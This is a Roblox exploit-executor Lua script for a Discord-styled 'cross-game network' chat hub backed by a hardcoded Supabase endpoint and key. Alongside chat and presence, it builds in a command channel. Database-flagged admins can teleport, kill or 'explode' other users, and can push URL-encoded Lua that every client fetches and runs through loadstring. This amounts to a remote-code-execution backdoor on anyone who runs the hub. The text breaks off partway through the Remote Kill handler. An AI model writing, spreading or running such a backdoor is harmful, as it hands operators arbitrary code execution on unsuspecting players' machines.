local request = (http and http.request) or http_request or (syn and (syn.request or syn.request))
if not request then
    warn("Your executor does not support HTTP requests.")
    return
end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

-- !!! YOUR SUPABASE CREDENTIALS CONFIGURATION !!!
local SUPABASE_URL = "https://nlavwcbdqcmoqmojraeu.supabase.co"
local SUPABASE_KEY = "sb_publishable__HC4Z5_wV2Daf8o-mgt89Q_z_JH2cif"

local JobId = game.JobId
local PlaceId = game.PlaceId
local Username = LocalPlayer.Name
local IsAdmin = false 
local IsSubAdmin = false
local SelectedTarget = "none" 

local rememberedPlayers = {}
local handledCommands = {} 
local lastChatTime = 0
local lastTeleportTime = 0 
local running = true
local currentTab = "users" 

_G.CurrentTpTarget = "none"
_G.CurrentActiveEffect = "none"

local gameName = "Roblox Game"
pcall(function()
    local info = MarketplaceService:GetProductInfo(PlaceId)
    gameName = info.Name
end)

local function getExecutor()
    if identifyexecutor then local name = identifyexecutor() return name or "Potassium" end
    return "Potassium"
end
local myExecutor = getExecutor()

-- Custom pure Lua URL decoding helper
local function cleanUrlDecode(str)
    str = string.gsub(str, "+", " ")
    str = string.gsub(str, "%%(%x%x)", function(hex)
        return string.char(tonumber(hex, 16))
    end)
    return str
end

local function sanitizeText(text)
    local clean = string.gsub(text, "<[^>]*>", "")
    if #clean > 1000 then clean = string.sub(clean, 1, 1000) end
    return clean
end

local function runLocalExplosionEffect(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local char = targetPlayer.Character
        local exp = Instance.new("Explosion")
        exp.Position = char.HumanoidRootPart.Position
        exp.BlastRadius = 0; exp.BlastPressure = 0; exp.Parent = workspace
        if char:FindFirstChild("Humanoid") then char.Humanoid.Health = 0 end
        char:BreakJoints()
        for _, part in ipairs(char:GetChildren()) do
            if part:IsA("BasePart") then
                part.Velocity = Vector3.new(math.random(-100, 100), math.random(80, 150), math.random(-100, 100))
            end
        end
    end
end

-- --- UI SETUP ---
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DiscordNetworkHub"
ScreenGui.ResetOnSpawn = false
pcall(function() ScreenGui.Parent = CoreGui end) -- Guard against locked CoreGui parent conditions

local WindowFrame = Instance.new("Frame")
WindowFrame.Size = UDim2.new(0, 680, 0, 440)
WindowFrame.Position = UDim2.new(0.5, -340, 0.5, -220)
WindowFrame.BackgroundColor3 = Color3.fromRGB(49, 51, 56); WindowFrame.BorderSizePixel = 0
WindowFrame.Active = true; WindowFrame.Parent = ScreenGui
Instance.new("UICorner", WindowFrame).CornerRadius = UDim.new(0, 8)

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 32); TitleBar.BackgroundColor3 = Color3.fromRGB(30, 31, 34); TitleBar.Parent = WindowFrame
Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 8)

local TitleText = Instance.new("TextLabel")
TitleText.Size = UDim2.new(1, -100, 1, 0); TitleText.Position = UDim2.new(0, 12, 0, 0); TitleText.BackgroundTransparency = 1
TitleText.Text = "Discord Sync Hub — Cross-Game Network"; TitleText.TextColor3 = Color3.fromRGB(242, 243, 245)
TitleText.Font = Enum.Font.GothamBold; TitleText.TextSize = 12; TitleText.TextXAlignment = Enum.TextXAlignment.Left; TitleText.Parent = TitleBar

local Controls = Instance.new("Frame")
Controls.Size = UDim2.new(0, 70, 1, 0); Controls.Position = UDim2.new(1, -75, 0, 0); Controls.BackgroundTransparency = 1; Controls.Parent = TitleBar

local MinBtn = Instance.new("TextButton")
MinBtn.Size = UDim2.new(0, 30, 0, 30); MinBtn.BackgroundTransparency = 1; MinBtn.Text = "—"; MinBtn.TextColor3 = Color3.fromRGB(181, 186, 193); MinBtn.Font = Enum.Font.GothamBold; MinBtn.TextSize = 14; MinBtn.Parent = Controls

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 30, 0, 30); CloseBtn.Position = UDim2.new(0, 35, 0, 0); CloseBtn.BackgroundTransparency = 1; CloseBtn.Text = "X"; CloseBtn.TextColor3 = Color3.fromRGB(181, 186, 193); CloseBtn.Font = Enum.Font.GothamBold; CloseBtn.TextSize = 14; CloseBtn.Parent = Controls

local BodyFrame = Instance.new("Frame")
BodyFrame.Size = UDim2.new(1, 0, 1, -32); BodyFrame.Position = UDim2.new(0, 0, 0, 32); BodyFrame.BackgroundTransparency = 1; BodyFrame.Parent = WindowFrame

local Sidebar = Instance.new("Frame")
Sidebar.Size = UDim2.new(0, 190, 1, 0); Sidebar.BackgroundColor3 = Color3.fromRGB(43, 45, 49); Sidebar.Parent = BodyFrame

local ChannelUsers = Instance.new("TextButton")
ChannelUsers.Size = UDim2.new(1, -16, 0, 32); ChannelUsers.Position = UDim2.new(0, 8, 0, 12); ChannelUsers.BackgroundColor3 = Color3.fromRGB(53, 55, 60); ChannelUsers.Text = "  #  users-network"; ChannelUsers.TextColor3 = Color3.fromRGB(255, 255, 255); ChannelUsers.Font = Enum.Font.GothamSemibold; ChannelUsers.TextSize = 13; ChannelUsers.TextXAlignment = Enum.TextXAlignment.Left; ChannelUsers.Parent = Sidebar
Instance.new("UICorner", ChannelUsers).CornerRadius = UDim.new(0, 4)

local ChannelServerChat = Instance.new("TextButton")
ChannelServerChat.Size = UDim2.new(1, -16, 0, 32); ChannelServerChat.Position = UDim2.new(0, 8, 0, 48); ChannelServerChat.BackgroundTransparency = 1; ChannelServerChat.Text = "  #  server-chat"; ChannelServerChat.TextColor3 = Color3.fromRGB(148, 155, 164); ChannelServerChat.Font = Enum.Font.GothamSemibold; ChannelServerChat.TextSize = 13; ChannelServerChat.TextXAlignment = Enum.TextXAlignment.Left; ChannelServerChat.Parent = Sidebar
Instance.new("UICorner", ChannelServerChat).CornerRadius = UDim.new(0, 4)

local ChannelGlobalChat = Instance.new("TextButton")
ChannelGlobalChat.Size = UDim2.new(1, -16, 0, 32); ChannelGlobalChat.Position = UDim2.new(0, 8, 0, 84); ChannelGlobalChat.BackgroundTransparency = 1; ChannelGlobalChat.Text = "  💬  global-cross-chat"; ChannelGlobalChat.TextColor3 = Color3.fromRGB(148, 155, 164); ChannelGlobalChat.Font = Enum.Font.GothamSemibold; ChannelGlobalChat.TextSize = 12; ChannelGlobalChat.TextXAlignment = Enum.TextXAlignment.Left; ChannelGlobalChat.Parent = Sidebar
Instance.new("UICorner", ChannelGlobalChat).CornerRadius = UDim.new(0, 4)

local ChannelExecPanel = Instance.new("TextButton")
ChannelExecPanel.Size = UDim2.new(1, -16, 0, 32); ChannelExecPanel.Position = UDim2.new(0, 8, 0, 120); ChannelExecPanel.BackgroundTransparency = 1; ChannelExecPanel.Text = "  🛠️  executor-panel"; ChannelExecPanel.TextColor3 = Color3.fromRGB(148, 155, 164); ChannelExecPanel.Font = Enum.Font.GothamSemibold; ChannelExecPanel.TextSize = 12; ChannelExecPanel.TextXAlignment = Enum.TextXAlignment.Left; ChannelExecPanel.Visible = false; ChannelExecPanel.Parent = Sidebar
Instance.new("UICorner", ChannelExecPanel).CornerRadius = UDim.new(0, 4)

local ViewContainer = Instance.new("Frame")
ViewContainer.Size = UDim2.new(1, -190, 1, 0); ViewContainer.Position = UDim2.new(0, 190, 0, 0); ViewContainer.BackgroundTransparency = 1; ViewContainer.Parent = BodyFrame

local UsersView = Instance.new("ScrollingFrame")
UsersView.Size = UDim2.new(1, -20, 1, -20); UsersView.Position = UDim2.new(0, 10, 0, 10); UsersView.BackgroundTransparency = 1; UsersView.BorderSizePixel = 0; UsersView.ScrollBarThickness = 4; UsersView.Parent = ViewContainer
local UsersLayout = Instance.new("UIListLayout", UsersView); UsersLayout.SortOrder = Enum.SortOrder.LayoutOrder; UsersLayout.Padding = UDim.new(0, 4)

local ChatView = Instance.new("Frame")
ChatView.Size = UDim2.new(1, -20, 1, -20); ChatView.Position = UDim2.new(0, 10, 0, 10); ChatView.BackgroundTransparency = 1; ChatView.Visible = false; ChatView.Parent = ViewContainer

local ChatScrolling = Instance.new("ScrollingFrame")
ChatScrolling.Size = UDim2.new(1, 0, 1, -45); ChatScrolling.BackgroundTransparency = 1; ChatScrolling.BorderSizePixel = 0; ChatScrolling.ScrollBarThickness = 4; ChatScrolling.Parent = ChatView
local ChatLayout = Instance.new("UIListLayout", ChatScrolling); ChatLayout.SortOrder = Enum.SortOrder.LayoutOrder; ChatLayout.Padding = UDim.new(0, 6)

local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(1, 0, 0, 38); TextBox.Position = UDim2.new(0, 0, 1, -38); TextBox.BackgroundColor3 = Color3.fromRGB(56, 58, 64); TextBox.TextColor3 = Color3.fromRGB(219, 222, 225); TextBox.Font = Enum.Font.Gotham; TextBox.TextSize = 14; TextBox.TextXAlignment = Enum.TextXAlignment.Left; TextBox.ClearTextOnFocus = true; TextBox.Parent = ChatView
Instance.new("UIPadding", TextBox).PaddingLeft = UDim.new(0, 12); Instance.new("UICorner", TextBox).CornerRadius = UDim.new(0, 6)

-- --- EXECUTOR PANEL MANAGEMENT ---
local ExecPanelFrame = Instance.new("Frame")
ExecPanelFrame.Size = UDim2.new(1, -20, 1, -20); ExecPanelFrame.Position = UDim2.new(0, 10, 0, 10); ExecPanelFrame.BackgroundTransparency = 1; ExecPanelFrame.Visible = false; ExecPanelFrame.Parent = ViewContainer

local TargetScroller = Instance.new("ScrollingFrame")
TargetScroller.Size = UDim2.new(0, 200, 1, 0); TargetScroller.BackgroundColor3 = Color3.fromRGB(30, 31, 34); TargetScroller.BorderSizePixel = 0; TargetScroller.ScrollBarThickness = 4; TargetScroller.Parent = ExecPanelFrame
local TargetLayout = Instance.new("UIListLayout", TargetScroller); TargetLayout.Padding = UDim.new(0, 4)
Instance.new("UICorner", TargetScroller).CornerRadius = UDim.new(0, 6)

local ControlPanel = Instance.new("Frame")
ControlPanel.Size = UDim2.new(1, -210, 1, 0); ControlPanel.Position = UDim2.new(0, 210, 0, 0); ControlPanel.BackgroundColor3 = Color3.fromRGB(43, 45, 49); ControlPanel.Parent = ExecPanelFrame
Instance.new("UICorner", ControlPanel).CornerRadius = UDim.new(0, 6)

local TopActionFrame = Instance.new("Frame")
TopActionFrame.Size = UDim2.new(1, 0, 0, 140); TopActionFrame.BackgroundTransparency = 1; TopActionFrame.Parent = ControlPanel

local ActiveTargetTitle = Instance.new("TextLabel")
ActiveTargetTitle.Size = UDim2.new(1, 0, 0, 25); ActiveTargetTitle.Position = UDim2.new(0, 10, 0, 5); ActiveTargetTitle.BackgroundTransparency = 1; ActiveTargetTitle.Text = "Selected Target: none"; ActiveTargetTitle.TextColor3 = Color3.fromRGB(255, 255, 255); ActiveTargetTitle.Font = Enum.Font.GothamBold; ActiveTargetTitle.TextSize = 13; ActiveTargetTitle.TextXAlignment = Enum.TextXAlignment.Left; ActiveTargetTitle.Parent = TopActionFrame

local BringBtn = Instance.new("TextButton")
BringBtn.Size = UDim2.new(0, 115, 0, 28); BringBtn.Position = UDim2.new(0, 10, 0, 35); BringBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242); BringBtn.Text = "Bring User (Server)"; BringBtn.TextColor3 = Color3.fromRGB(255, 255, 255); BringBtn.Font = Enum.Font.GothamBold; BringBtn.TextSize = 10; BringBtn.Parent = TopActionFrame
Instance.new("UICorner", BringBtn).CornerRadius = UDim.new(0, 4)

local TeleportToMeBtn = Instance.new("TextButton")
TeleportToMeBtn.Size = UDim2.new(1, -145, 0, 28); TeleportToMeBtn.Position = UDim2.new(0, 135, 0, 35); TeleportToMeBtn.BackgroundColor3 = Color3.fromRGB(35, 165, 90); TeleportToMeBtn.Text = "Teleport User to Me"; TeleportToMeBtn.TextColor3 = Color3.fromRGB(255, 255, 255); TeleportToMeBtn.Font = Enum.Font.GothamBold; TeleportToMeBtn.TextSize = 10; TeleportToMeBtn.Parent = TopActionFrame
Instance.new("UICorner", TeleportToMeBtn).CornerRadius = UDim.new(0, 4)

local RemoteKillBtn = Instance.new("TextButton")
RemoteKillBtn.Size = UDim2.new(0, 115, 0, 28); RemoteKillBtn.Position = UDim2.new(0, 10, 0, 70); RemoteKillBtn.BackgroundColor3 = Color3.fromRGB(242, 63, 67); RemoteKillBtn.Text = "Remote Kill"; RemoteKillBtn.TextColor3 = Color3.fromRGB(255, 255, 255); RemoteKillBtn.Font = Enum.Font.GothamBold; RemoteKillBtn.TextSize = 11; RemoteKillBtn.Parent = TopActionFrame
Instance.new("UICorner", RemoteKillBtn).CornerRadius = UDim.new(0, 4)

local RemoteExplodeBtn = Instance.new("TextButton")
RemoteExplodeBtn.Size = UDim2.new(1, -145, 0, 28); RemoteExplodeBtn.Position = UDim2.new(0, 135, 0, 70); RemoteExplodeBtn.BackgroundColor3 = Color3.fromRGB(230, 126, 34); RemoteExplodeBtn.Text = "Remote Explode"; RemoteExplodeBtn.TextColor3 = Color3.fromRGB(255, 255, 255); RemoteExplodeBtn.Font = Enum.Font.GothamBold; RemoteExplodeBtn.TextSize = 11; RemoteExplodeBtn.Parent = TopActionFrame
Instance.new("UICorner", RemoteExplodeBtn).CornerRadius = UDim.new(0, 4)

local EnvironmentLabel = Instance.new("TextLabel")
EnvironmentLabel.Size = UDim2.new(1, -20, 0, 20); EnvironmentLabel.Position = UDim2.new(0, 10, 0, 110); EnvironmentLabel.BackgroundTransparency = 1; EnvironmentLabel.Text = "Remote Environment Executor"; EnvironmentLabel.TextColor3 = Color3.fromRGB(181, 186, 193); EnvironmentLabel.Font = Enum.Font.GothamBold; EnvironmentLabel.TextSize = 11; EnvironmentLabel.TextXAlignment = Enum.TextXAlignment.Left; EnvironmentLabel.Parent = TopActionFrame

local CodeScrollingContainer = Instance.new("ScrollingFrame")
CodeScrollingContainer.Size = UDim2.new(1, -20, 1, -185); CodeScrollingContainer.Position = UDim2.new(0, 10, 0, 135); CodeScrollingContainer.BackgroundColor3 = Color3.fromRGB(30, 31, 34); CodeScrollingContainer.BorderSizePixel = 0; CodeScrollingContainer.ScrollBarThickness = 4; CodeScrollingContainer.CanvasSize = UDim2.new(2, 0, 5, 0); CodeScrollingContainer.Parent = ControlPanel
Instance.new("UICorner", CodeScrollingContainer).CornerRadius = UDim.new(0, 5)

local CodeBox = Instance.new("TextBox")
CodeBox.Size = UDim2.new(1, -10, 1, -10); CodeBox.Position = UDim2.new(0, 8, 0, 8); CodeBox.BackgroundTransparency = 1; CodeBox.TextColor3 = Color3.fromRGB(168, 228, 125); CodeBox.Font = Enum.Font.Code; CodeBox.TextSize = 12; CodeBox.TextXAlignment = Enum.TextXAlignment.Left; CodeBox.TextYAlignment = Enum.TextYAlignment.Top; CodeBox.ClearTextOnFocus = false; CodeBox.MultiLine = true; CodeBox.PlaceholderText = "-- Type cross-game runtime script source here...\n-- Direct target environment configuration rules apply."; CodeBox.Text = ""; CodeBox.Parent = CodeScrollingContainer

local RemoteExecuteCodeBtn = Instance.new("TextButton")
RemoteExecuteCodeBtn.Size = UDim2.new(1, -20, 0, 32); RemoteExecuteCodeBtn.Position = UDim2.new(0, 10, 1, -40); RemoteExecuteCodeBtn.BackgroundColor3 = Color3.fromRGB(35, 165, 90); RemoteExecuteCodeBtn.Text = "Deploy Cross-Game Execution String"; RemoteExecuteCodeBtn.TextColor3 = Color3.fromRGB(255, 255, 255); RemoteExecuteCodeBtn.Font = Enum.Font.GothamBold; RemoteExecuteCodeBtn.TextSize = 12; RemoteExecuteCodeBtn.Parent = ControlPanel
Instance.new("UICorner", RemoteExecuteCodeBtn).CornerRadius = UDim.new(0, 4)

local function selectTab(tab)
    currentTab = tab
    ChannelUsers.BackgroundTransparency = 1; ChannelUsers.TextColor3 = Color3.fromRGB(148, 155, 164)
    ChannelServerChat.BackgroundTransparency = 1; ChannelServerChat.TextColor3 = Color3.fromRGB(148, 155, 164)
    ChannelGlobalChat.BackgroundTransparency = 1; ChannelGlobalChat.TextColor3 = Color3.fromRGB(148, 155, 164)
    ChannelExecPanel.BackgroundTransparency = 1; ChannelExecPanel.TextColor3 = Color3.fromRGB(148, 155, 164)
    UsersView.Visible = false; ChatView.Visible = false; ExecPanelFrame.Visible = false

    if tab == "users" then
        ChannelUsers.BackgroundColor3 = Color3.fromRGB(53, 55, 60); ChannelUsers.TextColor3 = Color3.fromRGB(255, 255, 255); UsersView.Visible = true
    elseif tab == "server" then
        ChannelServerChat.BackgroundColor3 = Color3.fromRGB(53, 55, 60); ChannelServerChat.TextColor3 = Color3.fromRGB(255, 255, 255); TextBox.PlaceholderText = "Message #server-chat"; ChatView.Visible = true
    elseif tab == "global" then
        ChannelGlobalChat.BackgroundColor3 = Color3.fromRGB(53, 55, 60); ChannelGlobalChat.TextColor3 = Color3.fromRGB(255, 255, 255); TextBox.PlaceholderText = "Message #global-cross-chat"; ChatView.Visible = true
    elseif tab == "exec" then
        ChannelExecPanel.BackgroundColor3 = Color3.fromRGB(53, 55, 60); ChannelExecPanel.TextColor3 = Color3.fromRGB(255, 255, 255); ExecPanelFrame.Visible = true
    end
end

ChannelUsers.MouseButton1Click:Connect(function() selectTab("users") end)
ChannelServerChat.MouseButton1Click:Connect(function() selectTab("server") end)
ChannelGlobalChat.MouseButton1Click:Connect(function() selectTab("global") end)
ChannelExecPanel.MouseButton1Click:Connect(function() selectTab("exec") end)

local function systemLog(text, colorStr)
    local MsgFrame = Instance.new("Frame")
    MsgFrame.Size = UDim2.new(1, 0, 0, 22)
    MsgFrame.BackgroundTransparency = 1; MsgFrame.Parent = ChatScrolling

    local MsgLabel = Instance.new("TextLabel")
    MsgLabel.Size = UDim2.new(1, 0, 1, 0); MsgLabel.BackgroundTransparency = 1
    MsgLabel.TextXAlignment = Enum.TextXAlignment.Left; MsgLabel.Font = Enum.Font.GothamBold
    MsgLabel.TextSize = 12; MsgLabel.RichText = true
    MsgLabel.Text = string.format("<font color='%s'>%s</font>", colorStr or "rgb(150, 150, 150)", text)
    MsgLabel.Parent = MsgFrame
end

local function refreshUIList(data)
    for _, child in ipairs(UsersView:GetChildren()) do if child:IsA("Frame") then child:Destroy() end end
    for _, child in ipairs(TargetScroller:GetChildren()) do if child:IsA("TextButton") then child:Destroy() end end
    
    local uniquePool = {}
    for _, user in ipairs(data) do
        if not uniquePool[user.username] then
            uniquePool[user.username] = true

            local PlayerRow = Instance.new("Frame")
            PlayerRow.Size = UDim2.new(1, -6, 0, 45); PlayerRow.BackgroundColor3 = Color3.fromRGB(43, 45, 49); PlayerRow.Parent = UsersView
            Instance.new("UICorner", PlayerRow).CornerRadius = UDim.new(0, 4)

            local NameLabel = Instance.new("TextLabel")
            NameLabel.Size = UDim2.new(0.4, -10, 0, 22); NameLabel.Position = UDim2.new(0, 10, 0, 2); NameLabel.BackgroundTransparency = 1
            NameLabel.Text = user.username; NameLabel.Font = Enum.Font.GothamSemibold; NameLabel.TextSize = 13; NameLabel.TextXAlignment = Enum.TextXAlignment.Left
            
            if user.is_admin then NameLabel.TextColor3 = Color3.fromRGB(255, 235, 59); NameLabel.Text = "👑 " .. user.username
            elseif user.is_sub_admin then NameLabel.TextColor3 = Color3.fromRGB(168, 85, 247); NameLabel.Text = "🛡️ " .. user.username
            elseif user.username == Username then NameLabel.TextColor3 = Color3.fromRGB(242, 243, 245); NameLabel.Text = user.username .. " (You)"
            else NameLabel.TextColor3 = Color3.fromRGB(148, 155, 164) end
            NameLabel.Parent = PlayerRow

            local Subtitle = Instance.new("TextLabel")
            Subtitle.Size = UDim2.new(0.6, 0, 0, 18); Subtitle.Position = UDim2.new(0, 10, 0, 22); Subtitle.BackgroundTransparency = 1
            Subtitle.Text = "🎮 " .. user.current_game .. " | ⚙️ " .. user.executor; Subtitle.TextColor3 = Color3.fromRGB(110, 115, 122); Subtitle.Font = Enum.Font.Gotham; Subtitle.TextSize = 10; Subtitle.TextXAlignment = Enum.TextXAlignment.Left; Subtitle.Parent = PlayerRow

            if user.username ~= Username then
                local JoinBtn = Instance.new("TextButton")
                JoinBtn.Size = UDim2.new(0, 65, 0, 26); JoinBtn.Position = UDim2.new(1, -75, 0, 9); JoinBtn.BackgroundColor3 = Color3.fromRGB(35, 165, 90); JoinBtn.Text = "Join Game"; JoinBtn.TextColor3 = Color3.fromRGB(255, 255, 255); JoinBtn.Font = Enum.Font.GothamBold; JoinBtn.TextSize = 10; JoinBtn.Parent = PlayerRow
                Instance.new("UICorner", JoinBtn).CornerRadius = UDim.new(0, 4)
                JoinBtn.MouseButton1Click:Connect(function() TeleportService:TeleportToPlaceInstance(user.place_id, user.job_id, LocalPlayer) end)
            end

            if user.username ~= Username then
                local TargetSelectorBtn = Instance.new("TextButton")
                TargetSelectorBtn.Size = UDim2.new(1, -10, 0, 32); TargetSelectorBtn.BackgroundColor3 = (SelectedTarget == user.username) and Color3.fromRGB(53, 55, 60) or Color3.fromRGB(43, 45, 49)
                TargetSelectorBtn.Text = "  " .. user.username; TargetSelectorBtn.TextColor3 = Color3.fromRGB(219, 222, 225); TargetSelectorBtn.Font = Enum.Font.GothamSemibold; TargetSelectorBtn.TextSize = 12; TargetSelectorBtn.TextXAlignment = Enum.TextXAlignment.Left; TargetSelectorBtn.Parent = TargetScroller
                Instance.new("UICorner", TargetSelectorBtn).CornerRadius = UDim.new(0, 4)

                TargetSelectorBtn.MouseButton1Click:Connect(function()
                    SelectedTarget = user.username
                    ActiveTargetTitle.Text = "Selected Target: " .. user.username
                    for _, btn in ipairs(TargetScroller:GetChildren()) do
                        if btn:IsA("TextButton") then btn.BackgroundColor3 = Color3.fromRGB(43, 45, 49) end
                    end
                    TargetSelectorBtn.BackgroundColor3 = Color3.fromRGB(53, 55, 60)
                end)
            end
        end
    end
    UsersView.CanvasSize = UDim2.new(0, 0, 0, UsersLayout.AbsoluteContentSize.Y)
    TargetScroller.CanvasSize = UDim2.new(0, 0, 0, TargetLayout.AbsoluteContentSize.Y)
end

local function refreshChatUI(messages, adminPool)
    for _, child in ipairs(ChatScrolling:GetChildren()) do if child:IsA("Frame") then child:Destroy() end end
    for _, msg in ipairs(messages) do
        local MsgFrame = Instance.new("Frame")
        MsgFrame.Size = UDim2.new(1, 0, 0, 24); MsgFrame.BackgroundTransparency = 1; MsgFrame.Parent = ChatScrolling

        local MsgLabel = Instance.new("TextLabel")
        MsgLabel.Size = UDim2.new(1, 0, 1, 0); MsgLabel.BackgroundTransparency = 1; MsgLabel.TextXAlignment = Enum.TextXAlignment.Left; MsgLabel.Font = Enum.Font.Gotham; MsgLabel.TextSize = 13; MsgLabel.RichText = true
        
        local nameColor = adminPool[msg.username] and "rgb(255, 235, 59)" or "rgb(242, 243, 245)"
        local displayMsg = sanitizeText(msg.message)
        
        MsgLabel.Text = string.format("<font color='%s'><b>%s</b></font>: %s", nameColor, msg.username, displayMsg)
        MsgLabel.TextColor3 = Color3.fromRGB(219, 222, 225); MsgLabel.Parent = MsgFrame
    end
    ChatScrolling.CanvasSize = UDim2.new(0, 0, 0, ChatLayout.AbsoluteContentSize.Y)
    ChatScrolling.CanvasPosition = Vector2.new(0, ChatScrolling.CanvasSize.Y.Offset)
end

-- --- NETWORK BACKEND ---
local function updatePresence()
    if not running then return end
    request({
        Url = SUPABASE_URL .. "/rest/v1/executor_sync",
        Method = "POST",
        Headers = { ["apikey"] = SUPABASE_KEY, ["Authorization"] = "Bearer " .. SUPABASE_KEY, ["Content-Type"] = "application/json", ["Prefer"] = "resolution=merge-duplicates" },
        Body = HttpService:JSONEncode({ username = Username, job_id = JobId, place_id = PlaceId, current_game = gameName, executor = myExecutor, updated_at = "now()", teleport_target = _G.CurrentTpTarget, active_effect = _G.CurrentActiveEffect })
    })
end

local function sendChatMessage(text)
    local cleanMsg = sanitizeText(text)
    if cleanMsg == "" then return end
    if tick() - lastChatTime < 1.5 then return end
    lastChatTime = tick()

    local targetPayload = { username = Username, message = cleanMsg }
    if currentTab == "server" then targetPayload.job_id = JobId end

    request({
        Url = SUPABASE_URL .. "/rest/v1/executor_chat",
        Method = "POST",
        Headers = { ["apikey"] = SUPABASE_KEY, ["Authorization"] = "Bearer " .. SUPABASE_KEY, ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(targetPayload)
    })
end

local function fetchData()
    if not running then return end
    local pastThreshold = DateTime.fromUnixTimestamp(DateTime.now().UnixTimestamp - 25):ToIsoDate()
    
    local resUser = request({
        Url = SUPABASE_URL .. "/rest/v1/executor_sync?updated_at=gt." .. pastThreshold .. "&select=username,executor,teleport_target,active_effect,is_admin,is_sub_admin,current_game,job_id,place_id",
        Method = "GET",
        Headers = { ["apikey"] = SUPABASE_KEY, ["Authorization"] = "Bearer " .. SUPABASE_KEY }
    })
    
    local adminPool = {}
    if resUser.StatusCode == 200 then
        local users = HttpService:JSONDecode(resUser.Body)
        
        for _, u in ipairs(users) do
            if u.is_admin or u.is_sub_admin then adminPool[u.username] = true end
            if u.username == Username then
                if u.is_admin and not IsAdmin then IsAdmin = true; ChannelExecPanel.Visible = true end
                if u.is_sub_admin and not IsSubAdmin then IsSubAdmin = true; ChannelExecPanel.Visible = true end
            end
        end
        
        refreshUIList(users)
        
        -- --- ROLE-BASED INTERCEPTOR ---
        for _, user in ipairs(users) do
            if user.teleport_target ~= "none" and (user.teleport_target == Username or user.teleport_target == "all") then
                if tick() - lastTeleportTime > 5 then 
                    local allowedToTeleportMe = false
                    if user.is_admin or user.is_sub_admin then allowedToTeleportMe = true end 

                    if allowedToTeleportMe then
                        lastTeleportTime = tick() 
                        TeleportService:TeleportToPlaceInstance(user.place_id, user.job_id, LocalPlayer)
                    end
                end
            end

            if user.active_effect ~= "none" then
                local delimiterIndex = string.find(user.active_effect, "||PAYLOAD||")
                if delimiterIndex then
                    local headerPart = string.sub(user.active_effect, 1, delimiterIndex - 1)
                    local payloadPart = string.sub(user.active_effect, delimiterIndex + 11)
                    
                    local cmdData = string.split(headerPart, ":")
                    local action = cmdData[1]
                    local target = cmdData[2]
                    local uniqueHash = cmdData[3]

                    if not handledCommands[uniqueHash] then
                        local allowedToHarmMe = false
                        if user.is_admin or user.is_sub_admin then allowedToHarmMe = true end

                        if allowedToHarmMe then
                            handledCommands[uniqueHash] = true
                            if action == "runcode" and (target == Username or target == "all") then
                                local decodedCode = cleanUrlDecode(payloadPart)
                                local executable, execError = loadstring(decodedCode)
                                if executable then
                                    task.spawn(executable)
                                else
                                    warn("Cross-Game Suite Execution Error: " .. tostring(execError))
                                end
                            end
                        end
                    end
                else
                    local cmdData = string.split(user.active_effect, ":")
                    local action = cmdData[1]
                    local target = cmdData[2]
                    local uniqueHash = cmdData[3] 

                    if not handledCommands[uniqueHash] then
                        local allowedToHarmMe = false
                        if user.is_admin or user.is_sub_admin then allowedToHarmMe = true end 

                        if allowedToHarmMe then
                            handledCommands[uniqueHash] = true 
                            if action == "kill" or action == "explode" then
                                if target == Username or target == "all" then runLocalExplosionEffect(Username)
                                else runLocalExplosionEffect(target) end
                            end
                        end
                    end
                end
            end
        end
    end

    local queryFilter = (currentTab == "global") and "job_id=is.null" or "job_id=eq." .. JobId
    local resChat = request({
        Url = SUPABASE_URL .. "/rest/v1/executor_chat?" .. queryFilter .. "&order=created_at.desc&limit=30",
        Method = "GET",
        Headers = { ["apikey"] = SUPABASE_KEY, ["Authorization"] = "Bearer " .. SUPABASE_KEY }
    })
    if resChat.StatusCode == 200 then
        local msgs = HttpService:JSONDecode(resChat.Body)
        local orderedMsgs = {}
        for i = #msgs, 1, -1 do table.insert(orderedMsgs, msgs[i]) end
        refreshChatUI(orderedMsgs, adminPool)
    end
end

-- --- INPUT HANDLERS ---
TextBox.FocusLost:Connect(function(enterPressed) if enterPressed then local text = TextBox.Text; TextBox.Text = "" task.spawn(function() sendChatMessage(text) fetchData() end) end end)

BringBtn.MouseButton1Click:Connect(function()
    if (IsAdmin or IsSubAdmin) and SelectedTarget ~= "none" then
        _G.CurrentTpTarget = SelectedTarget; updatePresence()
        systemLog("Suite: Teleport signal locked on -> " .. SelectedTarget, "rgb(255, 235, 59)")
        task.delay(3, function() if _G.CurrentTpTarget == SelectedTarget then _G.CurrentTpTarget = "none"; updatePresence() end end)
    end
end)

TeleportToMeBtn.MouseButton1Click:Connect(function()
    if (IsAdmin or IsSubAdmin) and SelectedTarget ~= "none" then
        local hash = tostring(os.time() .. math.random(1,1000))
        local code = string.format([[
            local admin = game.Players:FindFirstChild("%s")
            if admin and admin.Character and admin.Character:FindFirstChild("HumanoidRootPart") then
                local myChar = game.Players.LocalPlayer.Character
                local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
                local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
                if myHrp then
                    if myHum then myHum.Sit = false end
                    myHrp.CFrame = admin.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                    myHrp.AssemblyLinearVelocity = Vector3.zero
                end
            end
        ]], Username)
        local payloadClean = HttpService:UrlEncode(code)
        _G.CurrentActiveEffect = "runcode:" .. SelectedTarget .. ":" .. hash .. "||PAYLOAD||" .. payloadClean
        updatePresence()
        systemLog("Suite: Teleport-to-me command sent -> " .. SelectedTarget, "rgb(35, 165, 90)")
        task.delay(4, function()
            if _G.CurrentActiveEffect:sub(1,7) == "runcode" then
                _G.CurrentActiveEffect = "none"
                updatePresence()
            end
        end)
    end
end)

RemoteKillBtn.MouseButton1Click:Connect(function()
    if (IsAdmin or IsSubAdmin) and SelectedTarget ~= "none" then
        local hash = tostring(os.time() .. math.random(1,1000))
